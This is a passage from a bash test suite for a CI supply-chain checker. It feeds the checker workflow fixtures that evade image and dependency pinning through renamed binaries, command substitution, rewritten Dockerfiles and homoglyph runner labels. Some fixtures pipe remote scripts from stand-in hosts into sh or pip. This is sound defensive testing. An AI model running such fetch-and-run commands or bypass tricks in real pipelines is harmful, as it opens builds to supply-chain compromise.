      - run: docker build -t alpine:latest ." "printf 'FROM busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ b8-pwsh                  bad "$head
    steps:
      - shell: pwsh
        run: |
          docker run \`
            alpine:latest"
case_ b8-default-shell-pwsh    bad "$head
    defaults:
      run:
        shell: pwsh
    steps:
      - run: echo x; docker pull alpine"
case_ b8-pwsh-refused         bad "$head
    steps:
      - shell: pwsh
        run: Write-Output hello"
case_ b8-bash-template-shell   bad "$head
    steps:
      - shell: bash --noprofile --norc -eo pipefail {0}
        run: docker run alpine"

# --- Sonnet #164 r2 (N1-N4, R1): forwarded arguments, renamed tool binaries, pip download/wheel, conda, manifests
case_ n1-forward-docker        bad "$(rb 'log_docker() { echo x; docker "$@"; }; log_docker run alpine')"
case_ n1-forward-pip           bad "$(rb 'log_pip() { pip "$@"; }; log_pip install requests')"
case_ n1-variable-verb         bad "$(rb 'v=run; docker "$v" alpine')"
case_ n2-copied-binary         bad "$(rb 'cp "$(command -v docker)" /tmp/d && /tmp/d run alpine:latest')"
case_ n2-linked-binary         bad "$(rb 'ln -s "$(which docker)" /tmp/d')"
case_ n2-copied-pip            bad "$(rb 'cp /usr/bin/pip3 /tmp/p')"
case_ n2-copy-other-file       ok  "$(rb 'cp Dockerfile.production /tmp/Dockerfile && ln -s /tmp/a /tmp/b')"
case_ n3-pip-download          bad "$(r 'pip download requests')"
case_ n3-pip-wheel             bad "$(r 'python3 -m pip wheel requests')"
case_ n3-download-hashed       ok  "$(rb 'pip download --require-hashes -r r.txt -d /tmp/w')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ n4-conda                 bad "$(r 'conda install -y requests')"
case_ n4-mamba                 bad "$(r 'micromamba create -n x python')"
case_ r1-manifest              bad "$(r 'docker manifest create multi alpine:latest busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ r1-imagetools            bad "$(r 'docker buildx imagetools create -t ghcr.io/x/out:1 alpine:latest')"
case_ r1-imagetools-pinned     ok  "$(r 'docker buildx imagetools create -t ghcr.io/x/out:1 alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"

# --- Sonnet #164 r3 (fixed after the cap): other container CLIs, other Python installers and build frontends
case_ x1-buildah               bad "$(r 'buildah pull alpine:latest')"
case_ x1-nerdctl               bad "$(r 'nerdctl run alpine:latest true')"
case_ x1-ctr                   bad "$(r 'ctr image pull docker.io/library/alpine:latest')"
case_ x1-crictl                bad "$(r 'crictl pull alpine:latest')"
case_ x2-uv-pip-sync           bad "$(r 'uv pip sync requirements.txt')"
case_ x2-uv-add                bad "$(r 'uv add requests')"
case_ x2-uv-run-with           bad "$(r 'uv run --with requests script.py')"
case_ x2-pipenv                bad "$(r 'pipenv install requests')"
case_ x2-poetry                bad "$(r 'poetry add requests')"
case_ x2-pip-sync              bad "$(r 'pip-sync requirements.txt')"
case_ x2-setup-py              bad "$(r 'python setup.py install')"
case_ x2-python-m-build        bad "$(r 'python3 -m build')"
# Codex #164 adversarial r1 C04: uv is not used here; any invocation is refused (was: hashed uv pip sync accepted)
case_ x2-uv-pip-sync-hashed    bad "$(r 'uv pip sync --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt"
case_ x2-python-script         ok  "$(r 'python3 bin/check.py --sync install')" "mkdir -p bin; : > bin/check.py"

# --- Sonnet #164 r4 (NEW-3, NEW-4): a decoy Dockerfile; command substitution severing the image argument
case_ n3-absolute-dockerfile   bad "$(rb 'docker build -f /tmp/Dockerfile .')" "mkdir -p sub; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > sub/Dockerfile"
case_ n3-written-dockerfile    bad "$(rb 'printf "FROM alpine:latest\\n" > Dockerfile; docker build .')" "mkdir -p sub; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > sub/Dockerfile"
case_ n3-tee-dockerfile        bad "$(rb 'echo FROM alpine | tee Dockerfile.prod >/dev/null; docker build -f Dockerfile.prod .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile.prod"
case_ n4-subst-run             bad "$(rb 'docker run $(echo alpine:latest) true')"
case_ n4-backtick-run          bad "$(rb 'docker run `echo alpine:latest` true')"
case_ n4-subst-quoted          bad "$(rb 'docker run "$(echo alpine:latest)" true')"
case_ n4-subst-skopeo          bad "$(rb 'skopeo copy $(echo docker://alpine:latest) dir:/tmp/x')"
case_ n4-subst-crane           bad "$(rb 'crane pull $(echo alpine:latest) out.tar')"
case_ n4-subst-imagetools      bad "$(rb 'docker buildx imagetools create -t m:1 $(echo alpine:latest)')"
case_ n4-subst-pip             bad "$(rb 'pip install --require-hashes -r r.txt $(cat extra)')"
case_ n4-inner-still-read      bad "$(rb 'x=$(docker pull alpine:latest)')"
case_ n4-nested                bad "$(rb 'docker run $(printf %s $(echo alpine)) true')"
case_ n4-subst-option-ok       ok  "$(rb 'docker run --name "$(date +%s)" --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"

# --- Sonnet #164 r5 (NEW-5, NEW-6): a committed Dockerfile mutated by any tool; pip -r bound to the repository
case_ n5-curl-o                bad "$(rb 'curl -fsSL -o Dockerfile https://x.example/D && docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-python-write          bad "$(rb 'python3 -c "open(\"Dockerfile\",\"w\").write(\"FROM alpine\")"; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-dd                    bad "$(rb 'echo FROM alpine | dd of=Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-sed-i                 bad "$(rb 'sed -i s/x/y/ Dockerfile && docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-echo-redirect         bad "$(rb 'echo FROM alpine >Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n5-read-only-ok          ok  "$(rb 'cat Dockerfile; sha256sum Dockerfile; grep FROM Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n6-r-absolute            bad "$(r 'pip install --require-hashes -r /tmp/nonexistent.txt')"
case_ n6-r-written             bad "$(rb 'printf "x==1 --hash=sha256:00\\n" > r.txt; pip install --require-hashes -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ n6-r-missing             bad "$(r 'pip install --require-hashes -r reqs/none.txt')"
case_ n6-r-repo-file           ok  "$(r 'pip install --require-hashes -r reqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n6-r-stdin-heredoc       ok  "$head
    steps:
      - run: |
          pip install --require-hashes -r /dev/stdin <<'REQ'
          x==1 --hash=sha256:00
          REQ"
case_ n6-r-stdin-no-heredoc    bad "$(rb 'curl -s https://x.example/r | pip install --require-hashes -r /dev/stdin')"
case_ n6-r-variable-review     ok  "$(rb 'for f in a b; do pip install --require-hashes -r "$f"; done')"
case_ n5-copy-into-context     ok  "$(rb 'cp build/docker/Dockerfile.* /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n5-copy-from-outside     bad "$(rb 'cp /tmp/evil/Dockerfile.a /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n5-copy-onto-name        bad "$(rb 'cp evil.txt Dockerfile.a && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n5-touch-in-subst        bad "$(rb 'x=$(sed -i s/a/b/ Dockerfile); docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n6-r-equals-form         ok  "$(r 'pip install --require-hashes --requirement=reqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n6-r-attached-form       ok  "$(r 'pip install --require-hashes -rreqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n6-r-from-subst          bad "$(rb 'pip install --require-hashes -r $(echo reqs/ok.txt)')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
# --- Sonnet #164 r6 (NEW-7): a file changed in an EARLIER step of the same job
case_ n7-earlier-step-docker   bad "$head
    steps:
      - run: sed -i s/a/b/ Dockerfile
      - run: docker build -t x ." "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n7-earlier-step-pip      bad "$head
    steps:
      - run: echo 'x==1 --hash=sha256:00' > reqs/ok.txt
      - run: pip install --require-hashes -r reqs/ok.txt" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
case_ n7-other-job-ok          ok  "$head
    steps:
      - run: docker build -t x .
  k:
    runs-on: ubuntu-latest
    steps:
      - run: cat Dockerfile" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n7-for-list-ok           ok  "$head
    steps:
      - run: for r in reqs/a.txt reqs/b.txt; do pip install --dry-run --require-hashes -r \"\$r\"; done
      - run: if grep -q x reqs/a.txt; then pip install --require-hashes -r reqs/a.txt; fi" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/a.txt; cp reqs/a.txt reqs/b.txt"
case_ n7-if-then-write         bad "$head
    steps:
      - run: if true; then echo 'x==1 --hash=sha256:00' > reqs/a.txt; fi
      - run: pip install --require-hashes -r reqs/a.txt" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/a.txt"
# --- Sonnet #164 r7 (NEW-8): every tool the POSIX scanner knows is also caught in a non-POSIX step
case_ n8-pwsh-buildah          bad "$head
    steps:
      - shell: pwsh
        run: buildah run x"
case_ n8-pwsh-nerdctl          bad "$head
    steps:
      - shell: pwsh
        run: nerdctl run alpine"
case_ n8-pwsh-ctr              bad "$head
    steps:
      - shell: pwsh
        run: ctr image pull x"
case_ n8-pwsh-crictl           bad "$head
    steps:
      - shell: pwsh
        run: crictl pull x"
case_ n8-pwsh-pipenv           bad "$head
    steps:
      - shell: pwsh
        run: pipenv install x"
case_ n8-pwsh-poetry           bad "$head
    steps:
      - shell: pwsh
        run: poetry add x"
case_ n8-pwsh-uv               bad "$head
    steps:
      - shell: pwsh
        run: uv add x"
case_ n8-pwsh-conda            bad "$head
    steps:
      - shell: pwsh
        run: conda install x"
case_ n8-pwsh-micromamba       bad "$head
    steps:
      - shell: pwsh
        run: micromamba create x"
case_ n8-pwsh-docker-compose   bad "$head
    steps:
      - shell: pwsh
        run: docker-compose up"
case_ n8-pwsh-rye              bad "$head
    steps:
      - shell: pwsh
        run: rye add x"
case_ n8-pwsh-pip-sync         bad "$head
    steps:
      - shell: pwsh
        run: pip-sync r.txt"
case_ n8-composite-pwsh         bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\\n  using: composite\\n  steps:\\n    - shell: pwsh\\n      run: buildah pull x\\n' > .github/actions/x/action.yml"
# --- Sonnet #164 r8 (NEW-9, NEW-10): Windows/macOS package managers; case-insensitive tool names; Windows default shell
wh='on: push
jobs:
  j:
    runs-on: windows-latest'
case_ n9-choco-bash              bad "$wh
    steps:
      - shell: bash
        run: choco install -y pkg"
case_ n9-winget-default          bad "$wh
    steps:
      - run: winget install --id Some.Pkg"
case_ n9-scoop                   bad "$wh
    steps:
      - shell: bash
        run: scoop install pkg"
case_ n9-brew                    bad "$wh
    steps:
      - run: brew install jq"
case_ n10-Docker-bash            bad "$wh
    steps:
      - shell: bash
        run: Docker run alpine:latest"
case_ n10-DOCKER-bash            bad "$wh
    steps:
      - shell: bash
        run: DOCKER RUN alpine:latest"
case_ n10-Pip-bash               bad "$wh
    steps:
      - shell: bash
        run: Pip install flask"
case_ n10-windows-default-pwsh   bad "$wh
    steps:
      - run: docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
case_ n10-windows-bash-refused bad "$wh
    steps:
      - shell: bash
        run: docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
case_ n10-windows-no-tools-refused bad "$wh
    steps:
      - run: Write-Output hi"
case_ n10-expr-runs-on          bad "on: push
jobs:
  j:
    runs-on: \${{ matrix.os }}
    steps:
      - run: docker pull alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667"
# --- advisor 0080: the checker's scope is ubuntu runners; any other runs-on (or one it cannot resolve) fails closed
ro() { printf 'on: push\njobs:\n  j:\n    runs-on: %s\n    steps:\n      - run: true' "$1"; }
case_ ro-ubuntu-latest         ok  "$(ro ubuntu-latest)"
case_ ro-ubuntu-version        ok  "$(ro ubuntu-24.04)"
case_ ro-ubuntu-arm            ok  "$(ro ubuntu-24.04-arm)"
case_ ro-windows               bad "$(ro windows-latest)"
case_ ro-macos                 bad "$(ro macos-14)"
case_ ro-self-hosted-list      bad "$(ro '[self-hosted, linux]')"
case_ ro-expression            bad "$(ro '\${{ matrix.os }}')"
case_ ro-group                 bad "on: push
jobs:
  j:
    runs-on:
      group: big
    steps:
      - run: true"
case_ ro-missing               bad "on: push
jobs:
  j:
    steps:
      - run: true"
case_ ro-reusable-call-ok      ok  "on: push
jobs:
  j:
    uses: ./.github/workflows/w2.yml" "printf 'on: workflow_call\\njobs:\\n  x:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - run: true\\n' > .github/workflows/w2.yml"

# --- REQ-REL-005-AC2 (advisor-approved read-back Oct 9, pin matrix): `runs-on: ${{ matrix.<key> }}` over a literal matrix of
# ubuntu-24.04 / ubuntu-24.04-arm is the one expression runner the check accepts, judged under bash; every other form is a
# runs-on finding and never a silent choice of shell. case_out also asserts WHICH finding was printed, and every tree commits
# plain stub scripts for the commands the fixtures call, so the runs-on rule is the only thing that can turn an accepted case.
# case_out <name> <ok|bad> <workflow text> <regex the output must match, or ''> [regex it must NOT match] [setup commands]
# IMPLICIT RULE: a bad case whose <must match> regex mentions runs-on is also held to exactly ONE finding line with `.runs-on: ` in it
# (the rule reports a job once); a case that must NOT print a runs-on finding says so in its <must NOT match> regex instead.
pm_run=0
case_out() {
  local name=$1 expect=$2 d="$work/$1" out got n
  pm_run=$((pm_run+1))
  mkdir -p "$d/.github/workflows" "$d/.github/agent/bin" "$d/bin" "$d/.github/agent/tests"
  printf '%s\n' "$3" > "$d/.github/workflows/w.yml"
  cp "$gate" "$d/.github/workflows/agent-review-gate.yml"
  : > "$d/.github/agent/bin/auditor-review-gate.py"; : > "$d/.github/agent/bin/check-action-pins.py"; : > "$d/bin/check-file-allowlist.sh"; : > "$d/.github/agent/tests/pin-wiring-test.sh"
  for s in build.sh witnessed.sh build-stage-apk.sh build-stage-rebuild-apk.sh install-scanner.sh; do   # committed, plain, pin-clean stubs
    printf '#!/usr/bin/env bash\nset -euo pipefail\n:\n' > "$d/bin/$s"; chmod +x "$d/bin/$s"
  done
  if [ -n "${6:-}" ]; then (cd "$d" && eval "$6"); fi
  if out=$(python3 "$here/../bin/check-action-pins.py" "$d" 2>&1); then got=ok; else got=bad; fi
  local why=""
  [ "$got" = "$expect" ] || why="exit $got, want $expect"
  if [ -z "$why" ] && [ -n "${4:-}" ] && ! grep -Eq -- "$4" <<<"$out"; then why="output lacks /$4/"; fi
  if [ -z "$why" ] && [ -n "${5:-}" ] && grep -Eq -- "$5" <<<"$out"; then why="output has /$5/"; fi
  if [ -z "$why" ] && [ "$expect" = bad ] && [[ "${4:-}" == *runs-on* ]]; then
    n=$(grep -Ec -- '\.runs-on: ' <<<"$out" || true); [ "$n" = 1 ] || why="$n runs-on findings, want exactly 1"
  fi
  if [ -z "$why" ]; then pass=$((pass+1)); echo "PASS $name → $got"
  else failn=$((failn+1)); echo "FAIL $name → $why"; [ -z "${VERBOSE:-}" ] || printf '%s\n' "$out" | head -3 | sed 's#^#     #'; fi
}
# a job `apk` on a matrix runner; $2 is the strategy block (ends in a newline or is empty), $3 the run: line of its last step
mx() { printf 'on: push\njobs:\n  apk:\n    runs-on: %s\n%s\n    steps:\n      - uses: actions/checkout@%s # v7.0.1\n      - run: %s' "$1" "$2" "$SHA" "${3:-bash bin/build.sh}"; }
st() { printf '    strategy:\n      matrix:\n        runner: %s\n' "$1"; }
M='${{ matrix.runner }}'
BOTH='[ubuntu-24.04, ubuntu-24.04-arm]'
# the two real jobs, copied verbatim from the PR 2 branch (origin/pipeline-chain-build-rebuild @ 2942097): stage-build.yml and
# stage-reproducibility.yml, job `apk` in full (permissions, checkout with:, the Witness install step, GH_TOKEN env, the artifact steps)
REAL_BUILD_APK=$(cat <<'REALEOF'
  apk:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04, ubuntu-24.04-arm]
    permissions:
      contents: read
      checks: read
      statuses: read
      pull-requests: read
      id-token: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          fetch-depth: 0
          fetch-tags: true
      - name: install Witness (pinned by checksum)
        run: ./bin/install-scanner.sh witness
      - name: apk under Witness
        env:
          GH_TOKEN: ${{ github.token }}
        run: bash bin/witnessed.sh apk bin/build-stage-apk.sh
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: apk-${{ matrix.runner }}
          path: out
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: witness-apk-${{ matrix.runner }}
          path: witness-apk
REALEOF
)
REAL_REBUILD_APK=$(cat <<'REALEOF'
  apk:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04, ubuntu-24.04-arm]
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          fetch-depth: 0
          fetch-tags: true
      - name: install Witness (pinned by checksum)
        run: ./bin/install-scanner.sh witness
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: witness-build
          path: witness-build
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: digests
          path: build-in
      - name: rapk under Witness
        run: bash bin/witnessed.sh rapk bin/build-stage-rebuild-apk.sh
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: rapk-${{ matrix.runner }}
          path: out
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: witness-rapk-${{ matrix.runner }}
          path: witness-rapk
REALEOF
)
real() { printf 'on: push\njobs:\n%s' "$1"; }
# the accepted forms: no finding at all
case_out pm-real-build-apk       ok  "$(real "$REAL_BUILD_APK")"   '0 finding' 'pwsh|runs-on'
case_out pm-real-rebuild-apk     ok  "$(real "$REAL_REBUILD_APK")" '0 finding' 'pwsh|runs-on'
case_out pm-one-label            ok  "$(mx "$M" "$(st '[ubuntu-24.04]')")" '0 finding' 'pwsh|runs-on'
case_out pm-arm-only             ok  "$(mx "$M" "$(st '[ubuntu-24.04-arm]')")" '0 finding' 'pwsh|runs-on'
case_out pm-block-list           ok  "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner:\n          - ubuntu-24.04\n          - ubuntu-24.04-arm\n')")" '0 finding' 'pwsh|runs-on'
case_out pm-fail-fast-false      ok  "$(mx "$M" "$(printf '    strategy:\n      fail-fast: false\n      matrix:\n        runner: [ubuntu-24.04]\n')")" '0 finding' 'pwsh|runs-on'
case_out pm-fail-fast-true       ok  "$(mx "$M" "$(printf '    strategy:\n      fail-fast: true\n      matrix:\n        runner: [ubuntu-24.04]\n')")" '0 finding' 'pwsh|runs-on'
case_out pm-other-key-name       ok  "$(mx '${{ matrix.os }}' "$(printf '    strategy:\n      matrix:\n        os: [ubuntu-24.04]\n')")" '0 finding' 'pwsh|runs-on'
case_out pm-clean-docker-step    ok  "$(mx "$M" "$(st "$BOTH")" "docker run alpine@$DIG true")" '0 finding' 'pwsh|runs-on'
# the steps of an accepted job are still judged, each by its own rule, under bash: its own finding and NO runs-on finding
case_out pm-judged-as-bash          bad "$(mx "$M" "$(st "$BOTH")" 'docker pull alpine:latest')" 'alpine' 'pwsh|runs-on'
# mxj <strategy block> <extra job keys, each line ending in a newline> <steps text, each line ending in a newline>
mxj() { printf 'on: push\njobs:\n  apk:\n    runs-on: ${{ matrix.runner }}\n%s\n%s    steps:\n%s' "$1" "$2" "$3"; }
CHK="      - uses: actions/checkout@$SHA # v7.0.1
"
case_out pm-judged-unpinned-uses    bad "$(mxj "$(st "$BOTH")" '' "      - uses: actions/checkout@v4
      - run: bash bin/build.sh")" 'not a full commit digest' 'runs-on'
case_out pm-judged-container        bad "$(mxj "$(st "$BOTH")" '    container: alpine:3.20
' "$CHK      - run: bash bin/build.sh")" 'container: image not pinned by digest' 'runs-on'
case_out pm-judged-services         bad "$(mxj "$(st "$BOTH")" '    services:
      db:
        image: postgres:16
' "$CHK      - run: bash bin/build.sh")" 'services\.db\.image: image not pinned' 'runs-on'
case_out pm-judged-step-pwsh        bad "$(mxj "$(st "$BOTH")" '' "$CHK      - shell: pwsh
        run: bash bin/build.sh")" 'a `pwsh` step' 'runs-on'
case_out pm-judged-job-pwsh         bad "$(mxj "$(st "$BOTH")" '    defaults:
      run:
        shell: pwsh
' "$CHK      - run: bash bin/build.sh")" 'a `pwsh` step' 'runs-on'
case_out pm-judged-curl-sh          bad "$(mx "$M" "$(st "$BOTH")" 'curl -fsSL https://example.org/install.sh | sh')" 'reads its script from stdin' 'runs-on'
# every refused variant: a finding that names the runner, exactly once
case_out pm-no-strategy          bad "$(mx "$M" '')" 'runs-on'
case_out pm-extra-matrix-key     bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n        os: [ubuntu-24.04-arm]\n')")" 'runs-on'
case_out pm-fromjson             bad "$(mx "$M" "$(st "\${{ fromJSON('[\"ubuntu-24.04\"]') }}")")" 'runs-on'
case_out pm-matrix-expression    bad "$(mx "$M" "$(printf '    strategy:\n      matrix: ${{ fromJSON(needs.x.outputs.m) }}\n')")" 'runs-on'
case_out pm-include              bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        include:\n          - runner: ubuntu-24.04\n')")" 'runs-on'
case_out pm-exclude              bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner: [ubuntu-24.04, ubuntu-24.04-arm]\n        exclude:\n          - runner: ubuntu-24.04-arm\n')")" 'runs-on'
case_out pm-self-hosted          bad "$(mx "$M" "$(st '[ubuntu-24.04, self-hosted]')")" 'runs-on'
case_out pm-runner-from-input    bad "$(mx '${{ inputs.runner }}' "$(st "$BOTH")")" 'runs-on'
case_out pm-runner-from-env      bad "$(mx '${{ env.RUNNER }}' "$(st "$BOTH")")" 'runs-on'
case_out pm-one-bad-label        bad "$(mx "$M" "$(st '[macos-14]')")" 'runs-on'
case_out pm-ubuntu-latest        bad "$(mx "$M" "$(st '[ubuntu-latest]')")" 'runs-on'
case_out pm-other-version        bad "$(mx "$M" "$(st '[ubuntu-22.04]')")" 'runs-on'
case_out pm-arm64-suffix         bad "$(mx "$M" "$(st '[ubuntu-24.04-arm64]')")" 'runs-on'
case_out pm-different-case       bad "$(mx "$M" "$(st '[Ubuntu-24.04]')")" 'runs-on'
case_out pm-trailing-space       bad "$(mx "$M" "$(st "['ubuntu-24.04 ']")")" 'runs-on'
case_out pm-trailing-newline     bad "$(mx "$M" "$(st '["ubuntu-24.04\n"]')")" 'runs-on'
case_out pm-block-scalar-label   bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner:\n          - |\n            ubuntu-24.04\n')")" 'runs-on'
case_out pm-greek-upsilon-label  bad "$(mx "$M" "$(st '[υbuntu-24.04]')")" 'runs-on'
case_out pm-en-dash-label        bad "$(mx "$M" "$(st '[ubuntu–24.04]')")" 'runs-on'
case_out pm-cyrillic-o-label     bad "$(mx "$M" "$(st '[ubuntu-24.О4]')")" 'runs-on'
case_out pm-tag-binary-label     bad "$(mx "$M" "$(st '[!!binary ubuntu-24.04]')")" 'runs-on'
# a matrix whose only key is `include` or `exclude` (a list of labels), read through `${{ matrix.include }}` / `${{ matrix.exclude }}`: refused
# although it looks like one key of labels; GitHub gives those two names another meaning
for IX in include exclude; do
  case_out pm-only-key-$IX bad "$(mx '${{ matrix.'$IX' }}' "$(printf '    strategy:\n      matrix:\n        %s: [ubuntu-24.04]\n' $IX)")" 'runs-on'
done
# the keyword is refused in any letter case (fail closed: whether GitHub reads it case-insensitively is not relied on)
for IX in Include EXCLUDE iNcLuDe; do
  case_out pm-only-key-$IX bad "$(mx '${{ matrix.'$IX' }}' "$(printf '    strategy:\n      matrix:\n        %s: [ubuntu-24.04]\n' $IX)")" 'runs-on'
done
# an explicit !!str tag resolves to the plain string tag, so the checker accepts it (the notes refuse any explicit tag other than str)
case_out pm-tag-str-label        ok  "$(mx "$M" "$(st '[!!str ubuntu-24.04]')")" '0 finding' 'pwsh|runs-on'
case_out pm-tag-unknown-label    bad "$(mx "$M" "$(st '[!x ubuntu-24.04]')")" 'runs-on'
case_out pm-nested-list          bad "$(mx "$M" "$(st '[[ubuntu-24.04]]')")" 'runs-on'
case_out pm-non-string-label     bad "$(mx "$M" "$(st '[24.04]')")" 'runs-on'
case_out pm-empty-list           bad "$(mx "$M" "$(st '[]')")" 'runs-on'
case_out pm-scalar-not-list      bad "$(mx "$M" "$(st 'ubuntu-24.04')")" 'runs-on'
case_out pm-duplicate-key        bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n        runner: [ubuntu-24.04-arm]\n')")" 'runs-on'
case_out pm-key-typo             bad "$(mx '${{ matrix.runnr }}' "$(st "$BOTH")")" 'runs-on'
case_out pm-runs-on-list         bad "$(mx '["${{ matrix.runner }}"]' "$(st "$BOTH")")" 'runs-on'
case_out pm-text-before          bad "$(mx 'ubuntu-${{ matrix.runner }}' "$(st "$BOTH")")" 'runs-on'
# text after the expression, a second expression, a block scalar's trailing newline and a missing space are all refused
case_out pm-text-after-8core     bad "$(mx '${{ matrix.runner }}-8core' "$(st "$BOTH")")" 'runs-on'
case_out pm-text-after-xlarge    bad "$(mx '${{ matrix.runner }}-xlarge' "$(st "$BOTH")")" 'runs-on'
case_out pm-second-expression    bad "$(mx '${{ matrix.runner }}${{ inputs.x }}' "$(st "$BOTH")")" 'runs-on'
case_out pm-second-expr-spaced   bad "$(mx '${{ matrix.runner }} ${{ vars.R }}' "$(st "$BOTH")")" 'runs-on'
case_out pm-block-scalar-runs-on bad "$(mx "$(printf '|\n      ${{ matrix.runner }}')" "$(st "$BOTH")")" 'runs-on'
case_out pm-folded-runs-on       bad "$(mx "$(printf '>\n      ${{ matrix.runner }}')" "$(st "$BOTH")")" 'runs-on'
case_out pm-matrix-index         bad "$(mx '${{ matrix.runner[0] }}' "$(st "$BOTH")")" 'runs-on'
case_out pm-matrix-property      bad "$(mx '${{ matrix.runner.name }}' "$(st "$BOTH")")" 'runs-on'
case_out pm-no-spaces            bad "$(mx '${{matrix.runner}}' "$(st "$BOTH")")" 'runs-on'
# the strategy block: only matrix (and a literal true/false fail-fast) beside it
case_out pm-fail-fast-capital    bad "$(mx "$M" "$(printf '    strategy:\n      fail-fast: True\n      matrix:\n        runner: [ubuntu-24.04]\n')")" 'runs-on'
case_out pm-fail-fast-expression bad "$(mx "$M" "$(printf '    strategy:\n      fail-fast: ${{ inputs.f }}\n      matrix:\n        runner: [ubuntu-24.04]\n')")" 'runs-on'
case_out pm-strategy-no-matrix   bad "$(mx "$M" "$(printf '    strategy:\n      fail-fast: true\n')")" 'runs-on'
case_out pm-matrix-given-twice   bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n      matrix:\n        runner: [ubuntu-24.04]\n')")" 'runs-on'
